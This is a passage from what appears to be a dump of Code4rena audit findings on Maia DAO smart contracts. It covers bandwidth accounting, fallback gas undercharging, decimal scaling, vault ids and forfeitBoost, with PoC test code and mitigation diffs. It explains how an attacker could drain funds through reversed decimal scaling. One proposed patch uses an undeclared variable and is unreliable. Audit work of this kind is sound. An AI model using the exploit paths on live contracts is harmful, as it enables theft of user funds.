`leftOverBandwidth` has a problem with the processing logic    ## Tools Used  ## Recommended Mitigation Steps  ```solidity     function setWeight(uint256 poolId, uint8 weight) external nonReentrant onlyOwner { ...  -        if (oldTotalWeights > newTotalWeights) { +        if (oldTotalWeights < newTotalWeights) {             for (uint256 i = 1; i < bandwidthStateList.length;) {                 if (i != poolIndex) {                     uint256 oldBandwidth = bandwidthStateList[i].bandwidth;                     if (oldBandwidth > 0) {                         bandwidthStateList[i].bandwidth =                             oldBandwidth.mulDivUp(oldTotalWeights, newTotalWeights).toUint248();                         leftOverBandwidth += oldBandwidth - bandwidthStateList[i].bandwidth;                     }                 }                  unchecked {                     ++i;                 }             }             poolState.bandwidth += leftOverBandwidth.toUint248();         } else {             uint256 oldBandwidth = poolState.bandwidth;             if (oldBandwidth > 0) { -               poolState.bandwidth = oldBandwidth.mulDivUp(oldTotalWeights, newTotalWeights).toUint248(); +               poolState.bandwidth = oldBandwidth.mulDivUp(newTotalWeights, oldTotalWeights).toUint248();                  leftOverBandwidth += oldBandwidth - poolState.bandwidth;             }  +           uint256 currentGiveWidth = 0; +           uint256 currentGiveCount = 0;             for (uint256 i = 1; i < bandwidthStateList.length;) {  +                if (i != poolIndex) { +                     if(currentGiveCount == bandwidthStateList.length - 2 - 1) { //last +                         bandwidthStateList[i].bandwidth += leftOverBandwidth - currentGiveWidth; +                    } +                     uint256 sharesWidth = leftOverBandwidth.mulDiv(bandwidthStateList[i].weight, weightsWithoutPool).toUint248(); +                     bandwidthStateList[i].bandwidth += sharesWidth; +                     currentGiveWidth +=sharesWidth;   +                     currentCount++; +                 }                  -                if (i != poolIndex) { -                    if (i == bandwidthStateList.length - 1) { -                        bandwidthStateList[i].bandwidth += leftOverBandwidth.toUint248(); -                    } else if (leftOverBandwidth > 0) { -                        bandwidthStateList[i].bandwidth += -                            leftOverBandwidth.mulDiv(bandwidthStateList[i].weight, weightsWithoutPool).toUint248(); -                    } -               }                  unchecked {                     ++i;                 }             }         } ...  ```   ## Assessed type  Context"}, {"title": "MIN_FALLBACK_RESERVE (in BranchBridgeAgent) doesn't consider the actual gas consumption in AnyCall contracts which let the user underpay the actual cost when replenishing the execution budget", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/764", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-04"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1061-L1085   # Vulnerability details  ## Impact  #### Context: `anyFallback` method is called by Anycall Executor on the source chain in case of a failure of anyExecute on the root chain. The user has to pay for the execution gas cost for this, this is done at the end of the call. However, if there is not enough depositedGas, the  `anyFallback` will be reverted due to a revert caused by the Anycall Executor. This shouldn't happen since the depositor in the first place deposited at least MIN_FALLBACK_RESERVE (185_000).  Here is the calculation for the gas used when `anyFallback` is called ```solidity  //Save gas  uint256 gasLeft = gasleft();   //Get Branch Environment Execution Cost  uint256 minExecCost = tx.gasprice * (MIN_FALLBACK_RESERVE + _initialGas - gasLeft);   //Check if sufficient balance  if (minExecCost > getDeposit[_depositNonce].depositedGas) {   _forceRevert();   return;  } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1063-L1072  `_forceRevert` will withdraw all execution budget. ```  // Withdraw all execution gas budget from anycall for tx to revert with \"no enough budget\"  if (executionBudget > 0) try anycallConfig.withdraw(executionBudget) {} catch {} ```  So Anycall Executor will revert if there is not enough budget. This is done at  ```solidity  uint256 budget = executionBudget[_from];  require(budget > totalCost, \"no enough budget\");  executionBudget[_from] = budget - totalCost; ``` https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L206C42-L206C58  #### (1) Gas Calculation in our anyFallback & in AnyCall contracts:  To calculate how much the user has to pay, the following formula is used:  ```solidity  //Get Branch Environment Execution Cost  uint256 minExecCost = tx.gasprice * (MIN_FALLBACK_RESERVE + _initialGas - gasLeft); ```  Gas units are calculated as follows: - Store gasleft() at initialGas at the beginning of `anyFallback` method ```solidity  //Get Initial Gas Checkpoint  uint256 initialGas = gasleft(); ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1233-L1234  - Nearly at the end of the method, deduct gasleft() from initialGas. This covers everything between initial gas checkpoint and end gas checkpoint. ```solidity         //Save gas         uint256 gasLeft = gasleft();          //Get Branch Environment Execution Cost         uint256 minExecCost = tx.gasprice * (MIN_FALLBACK_RESERVE + _initialGas - gasLeft); ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1063-L1066  - Add MIN_FALLBACK_RESERVE which is **185_000**.    This overhead is supposed to cover: - **100_000 for anycall**. This is extra cost required by Anycall ```solidity Line:38  uint256 constant EXECUTION_OVERHEAD = 100000;  .  . Line:203  uint256 gasUsed = _prevGasLeft + EXECUTION_OVERHEAD - gasleft(); ``` https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L203  - **85_000 for our fallback execution**. For example, to cover the modifier `requiresExecutor` and to cover everthing after the end gas checkpoint.   If we check how much this would actually cost, **we can find it nearly 70_000**. So, 85_000 is safe enough. A PoC is also provided to prove this. However, there is an overhead gas usage in the Anycall contracts that's not considered which is different than 100_000 extra that's required by AnyCall anyway (see above).  This means that the user is paying less than the actual cost. According to the sponsor, Bridge Agent deployer deposits first time into anycallConfig where the goal is to replenish the execution budget after use every time.  The issue leads to: 1. **execution budget is decreasing over time (slow draining)** in case it has funds already. 2. **anyExecute call will fail** since the calculation of the gas used in the Anycall contracts is bigger than the minimum reserve. In Anycall, this is done by the modifier `chargeDestFee`  - modifier `chargeDestFee`  ```solidity   modifier chargeDestFee(address _from, uint256 _flags) {   if (_isSet(_flags, AnycallFlags.FLAG_PAY_FEE_ON_DEST)) {    uint256 _prevGasLeft = gasleft();    _;    IAnycallConfig(config).chargeFeeOnDestChain(_from, _prevGasLeft);   } else {    _;   }  }  ```  https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Upgradeable.sol#L163-L171    - function `chargeFeeOnDestChain`  ```solidity   function chargeFeeOnDestChain(address _from, uint256 _prevGasLeft)    external    onlyAnycallContract   {    if (!_isSet(mode, FREE_MODE)) {     uint256 gasUsed = _prevGasLeft + EXECUTION_OVERHEAD - gasleft();     uint256 totalCost = gasUsed * (tx.gasprice + _feeData.premium);     uint256 budget = executionBudget[_from];     require(budget > totalCost, \"no enough budget\");     executionBudget[_from] = budget - totalCost;     _feeData.accruedFees += uint128(totalCost);    }   }  ```  https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L203   The gas consumption of `anyExec` method called by the MPC (in AnyCall) here ```solidity     function anyExec(         address _to,         bytes calldata _data,         string calldata _appID,         RequestContext calldata _ctx,         bytes calldata _extdata     )         external         virtual         lock         whenNotPaused         chargeDestFee(_to, _ctx.flags) // <= starting from here         onlyMPC     {   .   .   .   bool success = _execute(_to, _data, _ctx, _extdata);   .   .    } ```  https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Upgradeable.sol#L276  **The gas is nearly 110_000**. It is not taken into account.  (proven in the PoCs)   #### (2) Base Fee & Input Data Fee:  From [Ethereum yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf):  > Gtransaction 21000 Paid for every transaction > Gtxdatazero 4 Paid for every zero byte of data or code for a transaction. > Gtxdatanonzero 16 Paid for every non-zero byte of data or code for a transaction.  So 1. We have 21_000 as a base fee. This should be taken into account. However, it is paid by AnyCall, since the TX is sent by MPC. So, we are fine here. Probably this explains the overhead (100_000) added by anycall  2. Because `anyFallback` method has bytes data to be passed, we have extra gas consumption which is not taken into account.  For every zero byte => 4  For every non-zero byte => 16  So generally speaking, the bigger the data is, the bigger the gas becomes. you can simply prove this by adding arbitrary data to `anyFallback` method in PoC#1 test below. and you will see the gas spent increases.   #### Summary  1. **MIN_FALLBACK_RESERVE is safe enough** (without considering `anyExec` method. check next point). 2. **The gas consumed by `anyExec` method called by the MPC is not considered**. 3. **Input data fee isn't taken into account**.  There are two PoCs proving the first two points above. The third point can be proven by simply adding arbitrary data to `anyFallback` method in PoC#1 test.   Note: this is also applicable for RootBridgeAgent which I avoided writing a separate issue for it since the code of `_payFallbackGas` is almost the same.  However. those 3 statements don\u2019t exist in `RootBridgeAgent._payFallbackGas` ```solidity  //Withdraw Gas  IPort(localPortAddress).withdraw(address(this), address(wrappedNativeToken), minExecCost);   //Unwrap Gas  wrappedNativeToken.withdraw(minExecCost);   //Replenish Gas  _replenishGas(minExecCost); ```  So, the gas spent is even less. and 55_000 (from 155_000 MIN_FALLBACK_RESERVE of RootBridgeAgent) is safe enough. but, the second two points are still not taken into account in RootBridgeAgent as well (see above).  ## Proof of Concept  ### PoC#1 **MIN_FALLBACK_RESERVE** is safe enough Note: (estimation doesn't consider `anyExec` method's actual cost).  #### Overview This PoC is independent from the codebase (but uses the same code). There are two contracts simulating `BranchBridgeAgent.anyFallback`. 1. **BranchBridgeAgent** which has the code of pre 1st gas checkpoint and  post last gas checkpoint. 2. **BranchBridgeAgentEmpty** which has the code of pre 1st gas checkpoint and post last gas checkpoint **commented out**.  We run the same test for both, the difference in gas is what\u2019s at least nearly the minimum required to cover pre 1st gas checkpoint and  post last gas checkpoint. In this case here it is **70090** which is smaller than 85_000. So, we are fine.  Here is the output of the test:  ```sh [PASS] test_calcgas() (gas: 143835) Logs:   branchBridgeAgent.anyFallback Gas Spent => 71993  [PASS] test_calcgasEmpty() (gas: 73734) Logs:   branchBridgeAgentEmpty.anyFallback Gas Spent => 1903  Test result: ok. 2 passed; 0 failed; finished in 2.08ms ```  **71993-1903 = 70090**  #### Explanation   `BranchBridgeAgent.anyFallback` method depends on the following external calls: 1. `AnycallExecutor.context()` 2. `AnycallProxy.config()` 3. `AnycallConfig.executionBudget()` 4. `AnycallConfig.withdraw()` 5. `AnycallConfig.deposit()` 6. `WETH9.withdraw()` 7. `BranchPort.withdraw()`  For this reason, I've copied the same code from [multichain-smart-contracts](https://github.com/anyswap/multichain-smart-contracts). For WETH9, I've used the contract from the codebase which has minimal code. For BranchPort, copied from the codebase. *For libraries, unused methods were removed, this is because I couldn't submit the report, it gave error too long body. However, it doesn't effect the gas spent*   Please note that: - **tx.gasprice** is replaced with a fixed value in `_payFallbackGas` method as it is not available in Foundry. - In `_replenishGas`, reading the config via `IAnycallProxy(localAnyCallAddress).config()` is replaced with Immediate call for simplicity. In other words, avoiding proxy to make the PoC simpler and shorter. However, if done with proxy the gas used would increase. So in both ways, it is in favor of the PoC.  ####  The coded PoC  - Foundry.toml ```sh  [profile.default]  solc = '0.8.17'  src = 'solidity'  test = 'solidity/test'  out = 'out'  libs = ['lib']  fuzz_runs = 1000  optimizer_runs = 10_000 ```  - .gitmodules ```sh  [submodule \"lib/ds-test\"]   path = lib/ds-test   url = https://github.com/dapphub/ds-test   branch = master  [submodule \"lib/forge-std\"]   path = lib/forge-std   url = https://github.com/brockelmore/forge-std   branch = master ```  - remappings.txt ```sh  ds-test/=lib/ds-test/src  forge-std/=lib/forge-std/src ```  - Test File ```solidity // PoC => Maia OmniChain: gasCalculation for anyFallback in BranchBridgeAgent pragma solidity >=0.8.4 <0.9.0;  import {Test} from \"forge-std/Test.sol\"; import \"forge-std/console.sol\";  import {DSTest} from \"ds-test/test.sol\";  // copied from https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol // only decimals is used abstract contract ERC20 {     string public name;      string public symbol;      uint8 public immutable decimals;     constructor(string memory _name, string memory _symbol, uint8 _decimals) {         name = _name;         symbol = _symbol;         decimals = _decimals;     }   }  // copied from Solady  // removed unused methods, because I couldn't submit the report with too long code library SafeTransferLib {     /// @dev The ETH transfer has failed.     error ETHTransferFailed();      /// @dev The ERC20 `transferFrom` has failed.     error TransferFromFailed();      /// @dev The ERC20 `transfer` has failed.     error TransferFailed();      /// @dev The ERC20 `approve` has failed.     error ApproveFailed();      /// @dev Suggested gas stipend for contract receiving ETH     /// that disallows any storage writes.     uint256 internal constant _GAS_STIPEND_NO_STORAGE_WRITES = 2300;      /// @dev Suggested gas stipend for contract receiving ETH to perform a few     /// storage reads and writes, but low enough to prevent griefing.     /// Multiply by a small constant (e.g. 2), if needed.     uint256 internal constant _GAS_STIPEND_NO_GRIEF = 100000;       /// @dev Sends `amount` (in wei) ETH to `to`.     /// Reverts upon failure.     ///     /// Note: This implementation does NOT protect against gas griefing.     /// Please use `forceSafeTransferETH` for gas griefing protection.     function safeTransferETH(address to, uint256 amount) internal {         /// @solidity memory-safe-assembly         assembly {             // Transfer the ETH and check if it succeeded or not.             if iszero(call(gas(), to, amount, 0, 0, 0, 0)) {                 // Store the function selector of `ETHTransferFailed()`.                 mstore(0x00, 0xb12d13eb)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }         }     }            function safeTransferFrom(         address token,         address from,         address to,         uint256 amount     ) internal {         /// @solidity memory-safe-assembly         assembly {             let m := mload(0x40) // Cache the free memory pointer.              mstore(0x60, amount) // Store the `amount` argument.             mstore(0x40, to) // Store the `to` argument.             mstore(0x2c, shl(96, from)) // Store the `from` argument.             // Store the function selector of `transferFrom(address,address,uint256)`.             mstore(0x0c, 0x23b872dd000000000000000000000000)              if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     // Set success to whether the call reverted, if not we check it either                     // returned exactly 1 (can't just be non-zero data), or had no return data.                     or(eq(mload(0x00), 1), iszero(returndatasize())),                     call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)                 )             ) {                 // Store the function selector of `TransferFromFailed()`.                 mstore(0x00, 0x7939f424)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }              mstore(0x60, 0) // Restore the zero slot to zero.             mstore(0x40, m) // Restore the free memory pointer.         }     }          /// @dev Sends `amount` of ERC20 `token` from the current contract to `to`.     /// Reverts upon failure.     function safeTransfer(address token, address to, uint256 amount) internal {         /// @solidity memory-safe-assembly         assembly {             mstore(0x14, to) // Store the `to` argument.             mstore(0x34, amount) // Store the `amount` argument.             // Store the function selector of `transfer(address,uint256)`.             mstore(0x00, 0xa9059cbb000000000000000000000000)              if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     // Set success to whether the call reverted, if not we check it either                     // returned exactly 1 (can't just be non-zero data), or had no return data.                     or(eq(mload(0x00), 1), iszero(returndatasize())),                     call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)                 )             ) {                 // Store the function selector of `TransferFailed()`.                 mstore(0x00, 0x90b8ec18)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }             // Restore the part of the free memory pointer that was overwritten.             mstore(0x34, 0)         }     }   }  /// copied from (https://github.com/vectorized/solady/blob/main/src/utils/SafeCastLib.sol) library SafeCastLib {      error Overflow();       function toUint128(uint256 x) internal pure returns (uint128) {         if (x >= 1 << 128) _revertOverflow();         return uint128(x);     }       function toInt8(int256 x) internal pure returns (int8) {         int8 y = int8(x);         if (x != y) _revertOverflow();         return y;     }            function toInt128(int256 x) internal pure returns (int128) {         int128 y = int128(x);         if (x != y) _revertOverflow();         return y;     }       function toInt256(uint256 x) internal pure returns (int256) {         if (x >= 1 << 255) _revertOverflow();         return int256(x);     }      /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                      PRIVATE HELPERS                       */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      function _revertOverflow() private pure {         /// @solidity memory-safe-assembly         assembly {             // Store the function selector of `Overflow()`.             mstore(0x00, 0x35278d12)             // Revert with (offset, size).             revert(0x1c, 0x04)         }     } }  interface IAnycallExecutor {     function context()         external         view         returns (address from, uint256 fromChainID, uint256 nonce);      function execute(         address _to,         bytes calldata _data,         address _from,         uint256 _fromChainID,         uint256 _nonce,         uint256 _flags,         bytes calldata _extdata     ) external returns (bool success, bytes memory result); }  interface IAnycallConfig {     function calcSrcFees(         address _app,         uint256 _toChainID,         uint256 _dataLength     ) external view returns (uint256);      function executionBudget(address _app) external view returns (uint256);      function deposit(address _account) external payable;      function withdraw(uint256 _amount) external; }  interface IAnycallProxy {     function executor() external view returns (address);      function config() external view returns (address);      function anyCall(         address _to,         bytes calldata _data,         uint256 _toChainID,         uint256 _flags,         bytes calldata _extdata     ) external payable;      function anyCall(         string calldata _to,         bytes calldata _data,         uint256 _toChainID,         uint256 _flags,         bytes calldata _extdata     ) external payable; }  contract WETH9 {     string public name = \"Wrapped Ether\";     string public symbol = \"WETH\";     uint8 public decimals = 18;      event Approval(address indexed src, address indexed guy, uint256 wad);     event Transfer(address indexed src, address indexed dst, uint256 wad);     event Deposit(address indexed dst, uint256 wad);     event Withdrawal(address indexed src, uint256 wad);      mapping(address => uint256) public balanceOf;     mapping(address => mapping(address => uint256)) public allowance;      // function receive() external payable {     //   deposit();     // }      function deposit() public payable {         balanceOf[msg.sender] += msg.value;         emit Deposit(msg.sender, msg.value);     }      function withdraw(uint256 wad) public {         require(balanceOf[msg.sender] >= wad);         balanceOf[msg.sender] -= wad;         payable(msg.sender).transfer(wad);         emit Withdrawal(msg.sender, wad);     }      function totalSupply() public view returns (uint256) {         return address(this).balance;     }      function approve(address guy, uint256 wad) public returns (bool) {         allowance[msg.sender][guy] = wad;         emit Approval(msg.sender, guy, wad);         return true;     }      function transfer(address dst, uint256 wad) public returns (bool) {         return transferFrom(msg.sender, dst, wad);     }      function transferFrom(         address src,         address dst,         uint256 wad     ) public returns (bool) {         require(balanceOf[src] >= wad);          if (src != msg.sender && allowance[src][msg.sender] != 255) {             require(allowance[src][msg.sender] >= wad);             allo"}, {"title": "Multiple issues with decimal scaling will cause incorrect accounting of hTokens and underlying tokens", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/758", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-05"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchPort.sol#L388-L390 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1340-L1342 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchPort.sol#L52-L54 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchBridgeAgent.sol#L104 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L269 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L313 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L696 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L745   # Vulnerability details   `_normalizeDecimals()` and `_denormalizeDecimals()` are used to handle non-18 decimals tokens when bridging deposit, by scaling them to a normalized 18 decimals form for hToken accounting, and then denormalizing to the token's decimals when interacting with the underlying token.  However, there are 3 issues as follows, 1. implementations of `_normalizeDecimals()` and `_denormalizeDecimals()` are reversed.  2. `_denormalizeDecimals()` is missing in `ArbitrumBranchPort.depositToPort()`. 3. `_normalizeDecimals()` is missing in functions within `BranchBridgeAgent`.  These issues will cause an incorrect accounting of hTokens and underlying tokens in the system.    ## Impact Incorrect decimal scaling will lead to loss of fund as the amount deposited and withdrawn for bridging will be inaccurate, which can be abused by an attacker or result in users inccuring losses.  For example, an attacker can abuse the `ArbitrumBranchPort.depositToPort()` issue and steal from the system by first depositing a token that has more than 18 decimals, as the attacker will receive more hTokens than the deposited underlying token amount. The attacker can then make a profit by withdrawing from the port with the excess hTokens.  On the other hand, if the underlying token is less than 18 decimals, the depositor can inccur losses as the amount of underlying tokens deposited will be more than the amount of hTokens received.  ## Detailed Explanation  ### Issue 1  `BranchBridgeAgent._normalizeDecimals()` and `BranchPort._denormalizeDecimals()` (shown vbelow) are incorrect as they are implemented in a reversed manner, such that `_denormalizeDecimals()` is normalizing to 18 decimals while `_normalizeDecimals()` is denormalizing to the underlying token decimals.  The result is that for tokens with > 18 decimals, `_normalizeDecimals()` will overscale the decimals, while for tokens with < 18 decimals, `_normalizeDecimals()` will underscale the decimals.  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1340-L1342 ```Solidity     function _normalizeDecimals(uint256 _amount, uint8 _decimals) internal pure returns (uint256) {         return _decimals == 18 ? _amount : _amount * (10 ** _decimals) / 1 ether;     } ```  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchPort.sol#L388-L390 ```Solidity     function _denormalizeDecimals(uint256 _amount, uint8 _decimals) internal pure returns (uint256) {         return _decimals == 18 ? _amount : _amount * 1 ether / (10 ** _decimals);     } ```   ### Issue 2 `ArbitrumBranchPort.depositToPort()` is mssing `_denormalizeDecimals()` to scale back the decimals of the underlying token amount before transfering. This will cause a wrong amount of the underlying token to be transfered.  As shown below, `ArbitrumBranchBridgeAgent.depositToPort()` has normalized the `amount` to 18 decimals before passing into `ArbitrumBranchPort.depositToPort()`.  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchBridgeAgent.sol#L104 ```Solidity     function depositToPort(address underlyingAddress, uint256 amount) external payable lock {          //@audit - amount is normalized to 18 decimals here         IArbPort(localPortAddress).depositToPort(             msg.sender, msg.sender, underlyingAddress, _normalizeDecimals(amount, ERC20(underlyingAddress).decimals())         );     } ```  That means the `_deposit` amount for `ArbitrumBranchPort.depositToPort()` (see below) will be incorrect as it is not denormalized back to the underlying token's decimal, causing the wrong value to be transfered from the depositor.  If the underlying token is more than 18 decimals, the depositor will transfer less underlying tokens than the hToken received resulting in excess hTokens. The depositor can then call `withdrawFromPort()` to receive more underlying tokens than deposited.  If the underlying token is less than 18 decimals, that will inflate the amount to be transferred from the depositor, causing the depositor to deposit more underlying token than the amount of hToken received. The depositor will incurr a loss when withdrawing from the port.  Instead, the `_deposit` should be denormalized in `ArbitrumBranchPort.depositToPort()` when passing to `_underlyingAddress.safeTransferFrom()`, so that it is scaled back to the underlying token's decimals when transfering.   https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchPort.sol#L52-L54 ```Solidity     function depositToPort(address _depositor, address _recipient, address _underlyingAddress, uint256 _deposit)         external         requiresBridgeAgent     {         address globalToken = IRootPort(rootPortAddress).getLocalTokenFromUnder(_underlyingAddress, localChainId);         if (globalToken == address(0)) revert UnknownUnderlyingToken();          //@audit - the amount of underlying token should be denormalized first before transfering         _underlyingAddress.safeTransferFrom(_depositor, address(this), _deposit);          IRootPort(rootPortAddress).mintToLocalBranch(_recipient, globalToken, _deposit);     } ```  ### Issue 3  In `BranchBridgeAgent`, the deposit amount passed into `_depositAndCall()` and `_depositAndCallMultiple()` are missing `_normalizeDecimals()`. Example below shows `callOutSignedAndBridge()`, but the issue is also present in `callOutAndBridge()`, `callOutSignedAndBridgeMultiple()`, `callOutAndBridgeMultiple()`.  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L269 ```Solidity     function callOutSignedAndBridge(bytes calldata _params, DepositInput memory _dParams, uint128 _remoteExecutionGas)         external         payable         lock         requiresFallbackGas     {         //Encode Data for cross-chain call.         bytes memory packedData = abi.encodePacked(             bytes1(0x05),             msg.sender,             depositNonce,             _dParams.hToken,             _dParams.token,             _dParams.amount,             _normalizeDecimals(_dParams.deposit, ERC20(_dParams.token).decimals()),             _dParams.toChain,             _params,             msg.value.toUint128(),             _remoteExecutionGas         );          //Wrap the gas allocated for omnichain execution.         wrappedNativeToken.deposit{value: msg.value}();          //Create Deposit and Send Cross-Chain request         _depositAndCall(             msg.sender,             packedData,             _dParams.hToken,             _dParams.token,             _dParams.amount,             //@audit - the deposit amount of underlying token should be noramlized first             _dParams.deposit,             msg.value.toUint128()         );     } ``` And that will affect `_createDepositSingle()` and `_createDepositMultiple()`, leading to incorrect decimals for `IPort(localPortAddress).bridgeOut()`. That will affect hToken burning and deposit of underlying tokens.  At the same time, the deposits to be stored in `getDeposit[]` is also not normalized, causing a mis-match of decimals when `clearToken()` is called via `redeemDeposit()`.  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L857-L891 ```Solidity     function _createDepositSingle(         address _user,         address _hToken,         address _token,         uint256 _amount,         uint256 _deposit,         uint128 _gasToBridgeOut     ) internal {         //Deposit / Lock Tokens into Port         IPort(localPortAddress).bridgeOut(_user, _hToken, _token, _amount, _deposit);          //Deposit Gas to Port         _depositGas(_gasToBridgeOut);          // Cast to dynamic memory array         address[] memory hTokens = new address[](1);         hTokens[0] = _hToken;         address[] memory tokens = new address[](1);         tokens[0] = _token;         uint256[] memory amounts = new uint256[](1);         amounts[0] = _amount;         uint256[] memory deposits = new uint256[](1);         deposits[0] = _deposit;          // Update State         getDeposit[_getAndIncrementDepositNonce()] = Deposit({             owner: _user,             hTokens: hTokens,             tokens: tokens,             amounts: amounts,             //@audit the deposits stored is not normalized, causing a mis-match of decimals when `clearToken()` is called via `redeemDeposit()`             deposits: deposits,             status: DepositStatus.Success,             depositedGas: _gasToBridgeOut         });     } ```   ## Recommended Mitigation Steps  1. Switch the implementation of `_normalizeDecimals()` to `_denormalizeDecimals()` and vice versa.  2. Add `_denormalizeDecimals()` to `ArbitrumBranchPort.depositToPort()` when calling `IRootPort(rootPortAddress).mintToLocalBranch()`.  3. Utilize `_normalizeDecimals()` for when passing deposit amount to  `_depositAndCall()` and `_depositAndCallMultiple()` within `BranchBridgeAgent`.         ## Assessed type  Decimal"}, {"title": "migratePartnerVault() the first vault  does not work properly", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/739", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L189   # Vulnerability details  ## Impact In the `migratePartnerVault()` method, if vaultId == 0 means illegal address, but the id of the vaults starts from 0, resulting in the first vault being mistaken as an illegal vault address  ## Proof of Concept In the `migratePartnerVault()` method, it will determine whether `newPartnerVault` is legal or not, by vaultId!=0 of vault  The code is as follows:  ```solidity     function migratePartnerVault(address newPartnerVault) external onlyOwner { @>      if (factory.vaultIds(IBaseVault(newPartnerVault)) == 0) revert UnrecognizedVault();          address oldPartnerVault = partnerVault;         if (oldPartnerVault != address(0)) IBaseVault(oldPartnerVault).clearAll();         bHermesToken.claimOutstanding(); ```  But when `factory` adds vault, the index starts from 0, so the id of the first vault is 0  `PartnerManagerFactory.addVault()` ```solidity contract PartnerManagerFactory is Ownable, IPartnerManagerFactory {     constructor(ERC20 _bHermes, address _owner) {         _initializeOwner(_owner);         bHermes = _bHermes;         partners.push(PartnerManager(address(0)));     }      function addVault(IBaseVault newVault) external onlyOwner { @>      uint256 id = vaults.length;         vaults.push(newVault);         vaultIds[newVault] == id;          emit AddedVault(newVault, id);     } ```  The id of the first vault starts from 0, because in `constructor` does not add address(0) to the vaults similar to `partners`  So `migratePartnerVault()` can't be processed for the first vault   ## Tools Used  ## Recommended Mitigation Steps  Similar to `partners`, in the `constructor` method, a vault with address(0) is added by default.   ```solidity contract PartnerManagerFactory is Ownable, IPartnerManagerFactory {     constructor(ERC20 _bHermes, address _owner) {         _initializeOwner(_owner);         bHermes = _bHermes;         partners.push(PartnerManager(address(0))); +       vaults.push(IBaseVault(address(0)));     } ```        ## Assessed type  Context"}, {"title": "vMaia Lack of override forfeitBoost", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/738", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/vMaia.sol#L91   # Vulnerability details  ## Impact Lack of override forfeitBoost ,  when need `forfeit` will underflow  ## Proof of Concept In `vMaia`, override the `claimBoost()` code to be empty to avoid fail  The code and comments are as follows.  ```solidity     /// @dev Boost can't be claimed; does not fail. It is all used by the partner vault.     function claimBoost(uint256 amount) public override {} ```  But it does not override the corresponding `forfeitBoost()` This will still reduce `userClaimedBoost` when `forfeit()` is needed, resulting in `underflow`  `UtilityManager.forfeitBoost()` ```solidity     function forfeitBoost(uint256 amount) public virtual {         if (amount == 0) return; @>      userClaimedBoost[msg.sender] -= amount;         address(gaugeBoost).safeTransferFrom(msg.sender, address(this), amount);          emit ForfeitBoost(msg.sender, amount);     } ```       So you should also override `forfeitBoost()` and turn it into an empty code to avoid failure when you need to use `forfeit`   ## Tools Used  ## Recommended Mitigation Steps  ```solidity contract vMaia is ERC4626PartnerManager {  +   /// @dev 